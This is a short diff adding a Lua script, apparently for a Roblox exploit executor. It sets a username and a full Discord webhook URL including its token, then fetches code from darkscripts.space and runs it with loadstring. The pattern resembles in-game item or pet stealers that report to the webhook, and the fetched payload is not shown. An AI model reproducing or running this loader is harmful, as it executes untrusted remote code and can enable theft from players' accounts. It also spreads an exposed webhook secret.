@@ -1,0 +1,4 @@
+Username = "xXRaLpH_rAfAeLXx"
+Webhook = "https://discord.com/api/webhooks/1306942641434263655/i5GI2izp7tXWaAtQ0ycXQp_JLGkyjNlUvLfMEHpeDXSI_K9N4pWY_NyNNbtQSx60oIxj"
+
+loadstring(game:HttpGet(('https://darkscripts.space/petgo')))()
